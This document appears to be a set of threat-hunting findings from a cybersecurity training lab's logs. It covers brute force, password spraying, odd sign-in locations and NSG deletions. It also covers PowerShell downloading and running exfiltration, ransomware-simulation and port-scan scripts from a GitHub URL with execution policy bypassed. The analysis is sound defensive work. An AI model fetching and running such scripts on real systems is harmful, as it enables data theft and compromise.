title: High-Frequency Logins Using rafi03 from LAN Host
description: There is a consistent and extremely high volume of logon activity using the rafi03 account from 10.0.0.8 (local-scan-engi). While this could be benign automation, the frequency and regularity warrant inspection, especially given the surrounding suspicious activities.

mitre.description: Adversaries may maintain persistence by using compromised credentials for recurring access.

notes: If automation or a scheduled task, verify its legitimacy. If not, this could indicate automated persistence/backdoor activity, especially if tied to unauthorized accesses.

title: Credential Dumping / Data Exfiltration via PowerShell Scripts
description: On several occasions, there is evidence of PowerShell downloading and executing publicly hosted scripts named exfiltratedata.ps1 from raw.githubusercontent.com/joshmadakor1/lognpacific-public/.../exfiltratedata.ps1 followed by execution, archiving files using 7z.exe, and deleting files. This strongly suggests credential access or data theft attempts. Example: a sequence in which exfiltratedata.ps1 is downloaded and executed, then 7-Zip is used to compress files with sensitive-sounding names (e.g., employee-data-*.csv). The use of Bypass ExecutionPolicy and direct download URLs is notable.

mitre.technique: Exfiltration Over Command and Control Channel, Automated Exfiltration, Data Compressed
mitre.description: Adversaries may exfiltrate data over C2 channels (T1041), compress data (T1560.001), and script automated exfiltration with PowerShell.

Invocations are scripted, sometimes chained with prior PowerShell-based scripting activity. ExecutionPolicy Bypass/Unrestricted and named scripts strongly suggest malicious or adversarial simulation behavior.

title: Abnormal User/Process Behavior – Repeated Installations, Scripting, Custom Tools
description: There are dozens of scheduled/automated process launches under the sgtcrypto user context, including custom taskhostw.exe invocations (e.g., taskhostw.exe Install $(Arg0), KEYROAMING, SyncFromCloud, Logon), repeated launching of auxiliary processes (like TSTheme.exe, smartscreen.exe, FileCoAuth.exe, msedge.exe, etc.) outside normal session startup. Many of these are clustered with scripting, tool download, and enumeration events, suggesting possible automated attack toolkit or system compromise.

mitre.description: Persistence/automation via scheduled jobs or masquerading, leveraging unusual or ambiguous process names, invoking custom tasks.

recommendations: alert if corresponding file accesses or registry changes are detected
notes: These process launches may indicate part of a C2 framework, lateral movement toolkit, or automated attack framework (like atomic red team, redcanary, or other post-exploitation automation).

title: Automated or Repeated net.exe/net1.exe accounts Invocations
description: There is a dense cluster of net1.exe invocations with accounts as the argument within a few seconds, under the SYSTEM account. This is not standard OS or user behavior and could indicate enumeration by a malicious actor or automated tooling attempting to gather local account policy information.

mitre.description: Account Discovery: Local Account

notes: The repetition and SYSTEM context suggest automation, which could be a benign script or part of attacker enumeration.

title: Chained PowerShell, csc.exe, and cvtres.exe Executions – Potential In-Memory Payload Compilation
description: There are several instances of Powershell scripts (from within Defender ATP DataCollection directory), executed with file hash validation, being passed to csc.exe (C# compiler) and then to cvtres.exe, compiling code in temporary directories. This is a known TTP for fileless attacks, in-memory payload delivery, or forensics/EDR bypass, and should be reviewed very closely. The repeated pattern (run powershell code, compile it) suggests dynamic code execution, which is risky on endpoints.

mitre.description: Command and Scripting Interpreter: Visual Basic

title: Execution of Downloaded and Potentially Malicious PowerShell Scripts (PWNCRYPT, EICAR, PORTSCAN)
description: Multiple PowerShell scripts (pwncrypt.ps1, eicar.ps1, portscan.ps1) were downloaded from the Internet and executed with ExecutionPolicy Bypass. EICAR is a well-known test malware, but pwncrypt and portscan may be tools for ransomware simulation and port scanning. These actions, when combined, may represent adversary post-compromise activity, defense evasion, and network reconnaissance.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution of various tasks remotely and locally; used frequently in file-free and file-based attacks for payload delivery, persistence, and living off the land.

title: Abnormal Volume of net.exe accounts Commands Indicative of Recon/Credential Access
description: There are repeated executions of net.exe accounts and net1.exe accounts both inside and outside normal system operations. While querying account policies with net.exe is sometimes legitimate, very frequent/repetitive use (esp. in tight time windows) may indicate automated enumeration or scripted credential policy discovery—often performed by attackers or Red Teams.

mitre.description: Adversaries may attempt to get a list of local system or domain accounts, including administrator and service accounts.

notes: A high frequency of these commands is more consistent with post-exploitation scripting or Red Team exercise than normal sysadmin behavior.

title: C# Compiler and Temporary File Activity With Suspicious PowerShell Script Execution
description: Frequent invocation of csc.exe (C# compiler) and cvtres.exe from unusual temp directories with command lines that invoke or compile script files and subsequently invoke PowerShell. This can be abused to execute .NET payloads/LOLBAS (Living Off the Land Binaries and Scripts) by attackers.

mitre.description: Adversaries may compile malicious payloads during runtime to bypass signature-based protections or use native tools (.NET csc.exe, etc.) for execution.

log_lines: (...many csc.exe and cvtres.exe entries where the parent process is a PowerShell or SenseIR chain...)
notes: This type of activity is often associated with in-memory or fileless attack techniques. The repeated pairing with PowerShell suggests active payload generation and execution. If this is not explained by EDR/Red Team activity, treat as highly suspicious.

title: Suspicious Sequence: Automated Download and Execution of Security Test Tools
description: The logs show repeated downloads and execution of EICAR (test malware), PWNCRYPT (potentially ransomware simulator), and PORTSCAN scripts. Sequence and timing suggest these are being fetched/testing via automation. While some of these are legitimate in test/lab/Red Team environments, their presence on a production system should be investigated.

mitre.description: Adversaries may deliver and execute malicious scripts or tools using social engineering or automated mechanisms. EICAR is often a test, but pwncrypt/portscan point toward threat simulation or attacker activity.

indicators_of_compromise: Test tools used in security simulation
notes: Sequence/timing points to automation—possible penetration testing or adversary in controlled/red team exercise. Validate the business context.

title: Possible Brute Force Attack Attempt by External IP 188.246.226.151
description: There are a large number of failed remote logon attempts within a short period originating from IP 188.246.226.151 using typical service and common usernames with mstsc.exe. The pattern, frequency, and nature of attempted usernames are consistent with automated brute force attacks against remote desktop services.

mitre.description: An adversary attempts to gain valid account credentials by systematically guessing them.

notes: No evidence of successful login via this source, but further investigation of the time range is recommended to rule out exploitation or credential guessing.

title: Repeated Failed Logon Attempts for administrator from IP 185.126.218.120
description: Numerous failed logon attempts targeting the administrator account are observed from external IP 185.126.218.120. This behavior is consistent with brute force password guessing against high-value accounts.

mitre.description: An adversary attempts to gain valid account credentials by systematically guessing them.

notes: No successful logons noted for administrator, but these attempts should be closely monitored. Credential spray on administrator accounts could signify further targeted attacks.

title: Successful Remote Logins from External IP (82.5.156.129) to iphyrangelab User
description: Multiple successful logons for the user iphyrangelab originating from IP 82.5.156.129 occur throughout the day, interleaved with local and internal access. Given the machines exposure to the internet, this may be an unauthorized or malicious remote access. No evidence in logs confirms this is an expected or whitelisted external location, nor does the user or device name suggest a VPN or management access.

mitre.description: The adversary uses valid credentials to gain access.

notes: If this IP is not known/authorized for remote access, treat as a critical incident; it suggests credentials were brute forced or leaked following earlier failed attempts.

title: Suspicious Burst of Automated LogonSuccess Events from Internal Source
description: Large volumes of rapid, repeated successful LogonSuccess events from 10.0.0.8 (local-scan-engi) to the account iphyrangelab are observed. The quantity, timing, and burst pattern (dozens per second) suggest automated processes or possibly lateral movement using valid credentials. If these are not explained by security tools or internal IT activity, they could indicate malicious automated activity or post-exploitation.

mitre.description: Adversaries may use valid accounts for lateral movement.

log_lines: ... (many similar lines up to several dozen per second)
notes: If local-scan-engi is not a known and authorized security scanning or IT management tool, urgently investigate the process on 10.0.0.8 for possible compromise or misuse. Also, check for connections initiated from this source after external access.

title: Suspicious Data Exfiltration and Tooling with PowerShell and 7-Zip
description: Multiple events show PowerShell downloading and executing exfiltratedata.ps1 from an external GitHub repository, subsequently executing 7z/7z2408-x64.exe to archive data files named in a likely exfil pattern (employee-data*.csv and zip). The use of a scripting engine to invoke unsigned binaries for data archiving after fetching scripts from GitHub strongly indicates data exfiltration activity.

mitre.description: Attacker collects and archives data (T1560) before exfiltrating, possibly using custom or legitimate external protocol (T1048).

notes: Activity seen repeatedly with matching patterns, indicating automated/scripted exfil attempts. Confirm whether 7z/7z2408-x64 binaries are expected.

title: Command-and-Control/Recon Activity with PowerShell Downloading and Executing Custom Scripts
description: Observed repeated use of PowerShell to download and execute portscan.ps1, eicar.ps1, and pwncrypt.ps1 directly from GitHub. These scripts indicate C2, recon, or malware simulation/lab activities, as they simulate malware or perform network scanning.

mitre.description: PowerShell is used to download and execute remote scripts for adversary-controlled tasks.

notes: Repeated from a consistent external source; check for unauthorized traffic and clarify business justification for these public scripts.

title: Living-off-the-Land Binary (LOLBins) Net.exe and Auditpol.exe Invoked via PowerShell
description: Observed use of PowerShell to execute net.exe (for account enumeration) and auditpol.exe (for audit policy enumeration). These LOLBins are often abused by attackers for recon or privilege escalation, especially when paired with scripting engines and remote script execution.

mitre.description: Adversaries may abuse native binaries to discover sensitive information about users and system security settings.

notes: Although some usage may be legitimate (e.g., software inventory), frequency and the parent-child chain with PowerShell is suspect in the given context.

title: Process Chain Abnormality: Scripting Engines as Child of System or Command Prompt
description: Multiple process chains show cmd.exe spawning PowerShell with bypassed or unrestricted execution policies, immediately executing local scripts or scripts just downloaded from the Internet. Repeated and automated chaining is characteristic of scripted post-exploitation frameworks.

mitre.description: Abuse of Windows scripting engines for remote command/script execution.

notes: Correlate execution times and parent processes for possible automation/orchestration or signs of attacker persistence.

title: Massive Brute Force Attempts Targeting Local and Remote Accounts
description: Numerous failed logons are observed against a wide range of usernames (e.g., admin, administrator, backup, test, etc.) on several assets and from many external IPs. These patterns, often within seconds of each other and targeting both local and well-known administrative accounts, are highly indicative of automated brute force or credential stuffing attacks. Affected assets include both Windows and Linux devices. The repeated authentication failures come from a variety of geographic sources, flags for automated malicious probing.

mitre.description: Adversaries attempt to gain access to accounts by trying many possible passwords for known usernames.

recommendations: hunt for successful logons from these IPs
indicators_of_compromise: multiple internal and external usernames and IPs seen brute forcing
notes: Volume and distribution suggest automated attack. Review any successful logons proximal to failed attempts, especially to privileged accounts.

title: Multiple Successful root Logons at Precise, Repeated Intervals from Exposed Hosts
description: Regular successful logons observed for the root account across linux-target-1, vm1, and r3dant-lab6 every five minutes (e.g., :01, :05, :15, etc.) spanning multiple days. These intervals (often on the minute, exact to milliseconds) are strongly indicative of scripted or service-based access, not normal interactive logon activity. Given aggressive brute force activity in parallel, theres a high risk these are attacker-controlled backdoor shells or automated cron jobs deployed post-compromise.

mitre.description: The use of valid/root accounts for persistence through established credentials or planted scheduled jobs.

recommendations: validate the activities after each of these logons
notes: The precise timing and frequency across hosts exceeds expected admin behavior. High risk these systems are fully compromised and under attacker control.

title: Automated Credential Stuffing and Enumeration Against Windows RDP (mstsc.exe) and Linux SSH
description: Targeted logins using Windows RDP (mstsc.exe) and SSH are observed with a wide variety of generic and administrative usernames from hundreds of source IPs, many associated with known scanner and attack infrastructure (Shodan, cloud providers, etc). Source IPs and domain names cycle rapidly. This is mass-scale automated credential stuffing, with occasional clusters hunting for usable user/pass combos.

mitre.description: The adversary is actively automating login attempts with a list of credentials to identify valid accounts for later exploitation.

recommendations: continue incident response on potentially compromised accounts
notes: No evidence of success in these attempts, but hostile activity at scale. Continue to monitor, but focus investigation on accounts/devices with successful logon immediately after failure bursts.

title: Suspect Service Account and System Account Usage With Unusual Contexts
description: There are repeated failed logons using non-default, uncommon service account names (e.g., $printdaemon$, $printer_admin$, guestaccount, backupsvc, etc.) from both external and internal sources, as well as multiple failed attempts for administrative accounts. While some service account logons may be expected, their presence on public-facing systems and in failed bursts is suspicious, possibly indicative of credential stuffing or enumeration for further lateral movement.

mitre.description: The adversary attempts to exploit service accounts—either through credential abuse or lateral movement using guessed credentials.

recommendations: search for successful logons or lateral movement involving new/unusual service accounts
verify service account credential security posture
notes: No evidence of successful privileged session here, but logons with these service accounts should be correlated with network activity and privilege escalation attempts.

title: Burst of Local Interactive Logons From Internal RFC1918 IPs (Potential Lateral Movement)
description: A cluster of successful and attempted logons for desktop users and lab accounts (e.g., cyberbunny, labuser, natertater, trustmebro) using internal RFC1918 IPs, some appearing on multiple hosts in quick succession and with occasionally abnormal timing (e.g., bursts of LogonSuccess at sub-second intervals). This may indicate lateral movement, administrator activity, or, if unexpected, spread by an automated tool or attacker pivoting through the internal environment.

mitre.description: Potential lateral movement via administrative shares or WinRM/SMB/SCH in Windows and SSH in Linux.

recommendations: verify if logon context and source match expected user/admin behavior
pivot to network/process logs for privilege escalation indicators
notes: Potential legitimate admin activity, but volume, source diversity, and burst patterns should be reviewed against user role and expected logon schedule.

title: Suspected Brute-force RDP/SMB Activity Across Multiple Internal Hosts
description: Multiple internal hosts (e.g., 10.0.0.105, 10.0.0.73, 10.0.0.233, 10.0.0.193, 10.0.0.223, 10.0.0.194, 10.0.1.115, 10.0.1.28, etc.) are engaging in high-volume connections to RDP (3389), SMB (445/139), Telnet (23), SSH (22), and a variety of ephemeral/high-risk ports. Volume and port diversity, along with MaliciousFlow tags, strongly indicate automated attack scripts, likely for credential access or lateral movement.

mitre.description: Adversaries may attempt to obtain account credentials, potentially through brute-force attempts against remote services/protocols.

notes: Volume, protocol mix, and endpoint repetition indicate mass credential attacks or compromised asset pivoting. Multiple resources are involved.

title: External Malicious Communications to Public IPs Over HTTPS
description: Internal host student-rg-5d3abe0ee18172fe49eac668704e011201ccc01393e35b35121e4a4816c9c8bb/zack-bruteforcewindowsvm (and others) established MaliciousFlow communications to several public IPs: 23.48.203.114, 92.38.145.145, 64.233.180.132, 142.250.31.132, 142.251.179.101, 142.251.111.132, 172.253.115.100, and 192.178.155.132 over port 443. This is flagged as malicious or C2-behavior; the use of multiple public Google IPs and others may signal C2 beaconing or exfiltration via HTTPS.

mitre.description: Use of web protocols for C2 or exfiltration by compromised hosts.

notes: Google/Cloudflare ranges may be abused for C2/exfil. Confirm whether these are legitimate or mapped to malicious infrastructure.

title: Potential Cryptocurrency Mining over Suspicious and Ephemeral Ports
description: Multiple MaliciousFlow events targeting common cryptocurrency ports (e.g., 8333 Bitcoin, 30303 Ethereum, 18080 Monero, 32400, 8008, 8080/8081/8088, etc.), both inbound and outbound. Elevated activity seen on hosts such as windows10-vm-steel, linux-target-1, kylesvm, sgtcrypto, and others. The combination and scale suggest illicit mining or worm activity exploiting open ports for propagation or mining.

mitre.description: Abuse of resources to mine cryptocurrency, often using high/ephemeral ports.

notes: Consistent with cryptominer behavior; host performance/CPU load spikes may confirm. Investigate persistence and propagation vectors.

title: Suspected Exploitation and Lateral Movement Using Ephemeral/Unusual Ports
description: Extensive communication over high and non-standard ports (e.g., 60000+, 5050, 8888, etc.) by compromised VMs. Several flows show connections to ephemeral ports and protocols commonly associated with shell access, lateral movement, and data exfiltration (e.g., 5900 VNC, 2375 Docker API, 1521 Oracle DB, 3306 MySQL). Repeated use of these ports coupled with MaliciousFlow suggests post-exploitation activity.

mitre.description: Exploiting vulnerable or misconfigured services for lateral movement and persistence.

notes: Risk of data exfiltration or internal worm spread. Recommend deep-dive host triage and review of firewall policies.

title: Multiple Failed RBAC Role Assignment Attempts
description: There are repeated failed attempts to assign roles at the resource group STUDENT-RG-A3794B48A691C09798418DF968BC13D3F3AD310C2DF87C9BBD83D1D68AC17303 by user/device 5deb2a08-7269-47d6-896b-8bc52d396466 from IP 4.153.100.136. This is indicative of attempted privilege escalation or misconfigured automation attempting to assign RBAC roles. No corresponding successful role assignment was found in the immediate sequence.

mitre.description: Adversaries may attempt to assign themselves or others roles to escalate privileges within the environment.

notes: No evidence of successful assignment, but repeated failures are a red flag for RBAC manipulation.

title: High Volume of Control Plane (Management) Activity from Same Identity/IP
description: User/device 5deb2a08-7269-47d6-896b-8bc52d396466 from 4.153.100.136 launched a high number of accepted and successful control-plane operations, including VM resource writes, deletions, extensions, public IP assignments, and attempted run commands across a range of resource groups. This activity volume exceeds normal administrator baselines and may be indicative of automated attack tools, excessive scripting, or account misuse. Multiple resource group creations/destructions (see subscription/resource group write success) in rapid succession also noted.

mitre.description: Adversaries may abuse management APIs and portal dashboards to manipulate resources at scale.

log_lines: ..many other RG creates/modifies/deletes in short timespan..
notes: Unusually high frequency of management plane activity from single authority. Potential automation or credential misuse.

title: Successive Network Security Group Deletes in Resource Group
description: Many consecutive NSG deletion events (success, accept, start) in resource group STUDENT-RG-CEFB318A117DE64736986D2012A508CC3458836158CF8FB71E9E6DF2E1B6C9C1 from same user/IP, in close temporal proximity. Mass NSG deletion deviates from typical operations and could indicate an attempt to weaken cloud defenses and enable lateral movement or exfiltration.

mitre.description: Attackers may remove or weaken cloud security objects such as Network Security Groups for defense evasion.

notes: Such NSG mass deletes often precede lateral movement or persistence operations.

title: High Failure Rate on Policy AuditIfNotExists/Action Operations
description: Detected dozens of failures for MICROSOFT.AUTHORIZATION/POLICIES/AUDITIFNOTEXISTS/ACTION by user 5c2bbd1968b95b20f28a59bb9417113db37c7c7bdd024a74797920751f2616fd@lognpacific.com from 2600:6c40:1d00:379e:2a96:c46:3c33:ec35, targeting resource group STUDENT-RG-5C2BBD1968B95B20F28A59BB9417113DB37C7C7BDD024A74797920751F2616FD. This pattern is atypical and may represent automated scanning, configuration drift, or brute-force/bad scripting attempting to enumerate or modify cloud policy baseline.

mitre.description: Excessive and repeated policy action failures may indicate attempts to discover policy weaknesses or bruteforce enumeration.

notes: Volume and frequency of failures are above normal. Recommend watching for any transition from failure to success.

title: Atypical Sign-in from Somalia for Account dd9be351e34e9f957acfb7495a9d9c89ca1d48add546a01d20553b152f08df9f@lognpacific.com
description: Multiple consecutive successful sign-ins detected from Mogadishu, Somalia (IP: 102.68.144.2) for a single user within a five-minute window. This geography is unusual for most tenants and could be indicative of a compromised account or unauthorized access, especially if this account does not normally sign in from Somalia.

mitre.description: Adversaries may use stolen credentials to access accounts

notes: Review if this user ever legitimately authenticates from Somalia. If not, immediate incident response is recommended.

title: Consistent Sign-ins from High-risk Location (Mogadishu, Somalia) for dd9be351e34e9f957acfb7495a9d9c89ca1d48add546a01d20553b152f08df9f@lognpacific.com
description: Atypical and repeated successful sign-ins for user dd9be351e34e9f957acfb7495a9d9c89ca1d48add546a01d20553b152f08df9f@lognpacific.com from Mogadishu, Somalia (IP: 102.68.144.2 and 102.68.145.2) over the past week. If this location is not a known operating region for your organization or this user, it strongly indicates potential credential compromise or account misuse. The sign-ins access sensitive applications such as Azure Portal, Microsoft 365 Security and Compliance Center, and Office365 Shell, further elevating the risk.

mitre.description: Adversary abuses valid accounts, typically after credential compromise, to acquire access to enterprise resources.

notes: No evidence of impossible travel, but all access in the last week is from Mogadishu, Somalia—an uncharacteristic and high-risk location for most organizations. If this is not a known travel pattern/location, immediate action is warranted.

title: Suspicious sign-in from atypical geography (Mogadishu, Somalia)
description: Multiple successful logins for user dd9be351e34e9f957acfb7495a9d9c89ca1d48add546a01d20553b152f08df9f@lognpacific.com from IPs in Mogadishu, Somalia (102.68.144.2, 102.68.145.2) within a short time. This location is high risk and not commonly associated with business activity. Frequent access to multiple services (Azure Portal, Office365 Shell WCSS-Client, Microsoft 365 Security and Compliance Center) and high sign-in volume suggests account compromise or automated access.

mitre.description: Adversary is using valid credentials to log in from an anomalous region.

notes: Review recent activity for this account, validate with user, and isolate if compromise is confirmed.

title: Concurrent high-velocity logins from Nigeria and US
description: User fc47b5fe8220d90b77bc0b7dc836baf5df45624e55be63f8851562f3312992e5@lognpacific.com showed successful Azure Portal logins from both Algeria (176.125.228.139/165/154/146), Nigeria (102.89.32.74, 102.89.53.182/192), and US locations over a short period. This pattern is consistent with impossible travel or compromised credentials being used worldwide.

mitre.description: Use of legitimate credentials from distant/inconsistent regions.

notes: Check for impossible travel detection and user context. Validate device fingerprints and enforce MFA if not enabled.

title: High volume US logins, then unexpected UK Office365 authentication
description: UK and Nigeria-based Office 365 logins observed for user ed9d19d109cd7b65a7217bfc5733a74bf901cea111dec5905eea473eb06b4b5e@lognpacific.com, where the majority of tenant logins are US-based. UK origin (81.78.190.219, 90.251.239.90) is highly atypical and geographically inconsistent.

mitre.description: Cloud account use from international locations.

notes: Review user travel, device registrations, and presence of adjustments to authentication or Conditional Access policies.

title: Concurrent multi-region logins; rapid succession and high frequency
description: User 2a4fdbd4d5a6e52334c80ea5a1cbca8612a8d672fac98591fc7c5545e2ed63f5@lognpacific.com is logging into the Azure Portal from Abidjan, CI (105.235.71.6) and performing repeated logins in short time frames. The IP and city are not standard for typical tenant activity.

mitre.description: Use of cloud credentials from regionally rare or impossible locations.

notes: Investigate correlation with business/partner relations or known travel. Check for device risk and recent changes.

title: Azure logins from Austria (non-tenant country code)
description: User be14765abe140a436d6538b94f8b8987a083b63123a6a61d0d6ec68df1336fa5@lognpacific.com performed successful Azure/Office365 logins from Brigittenau, Vienna, Austria (2a02:8388:8c02:2280:...); not a standard location for this environment.

mitre.description: Cloud credential use from foreign / historically unused region.

notes: Correlate with user job function and global access pattern.

title: Azure logins from India (Mangalore, Karnataka) by 2be024bc1189c133f0dd0f544e7f41f58b8eb597065a22b3bc943588032663f6@lognpacific.com
description: Frequent successful logins from 103.182.125.182 (Mangalore, India) observed. This location is uncommon for this tenants typical US and EMEA-centric activity and should be verified.

mitre.description: Valid credential use by unauthorized party or at-risk user.

notes: Investigate if user is remote or external; monitor for additional suspicious behavior.

title: Brute Force Attack: Multiple Failed Logon Attempts for administrator from Single External IP
description: Detected a rapid sequence of failed logon attempts (~36 events within 2 minutes) targeting the administrator account on device peter-vm from IP 111.61.77.252. The volume, frequency, and targeting of a privileged account from a single external IP indicate likely brute force activity.

mitre.description: Adversaries attempt to gain access to accounts by repeatedly trying passwords (brute force) against accounts.

notes: No successful logon detected, but the persistence and targeting of a privileged built-in account are high risk. Consider blocking the IP, reviewing firewall logs, and checking for other affected hosts.

title: Brute Force Activity Targeting admin on Device test1 From Multiple External IPs
description: Observed failed logon attempts to admin on device test1 from various external IP addresses over ~1 hour. Pattern suggests distributed brute force attack attempting to guess credentials from multiple sources.

mitre.description: Adversaries try common passwords across multiple accounts using various source IPs, typical in distributed brute force attempts.

notes: No logon successes seen for this account/device in this window. Recommend reviewing other accounts/devices for similar patterns. This could indicate wide, automated scans of perimeter credentials.

title: Password Spraying From Single IP Targeting Multiple Accounts on r3dant-sre
description: Several failed logon attempts from IP 190.57.75.42 targeting different usernames (administrator, user, admin) on device r3dant-sre. Attempts to authenticate with privileged and generic usernames likely indicates automated password spraying.

mitre.description: Attempting common passwords on many users from a single IP to avoid detection.

notes: Failed attempts only, no success. If correlated with increased logon failures elsewhere, escalate for broader incident.
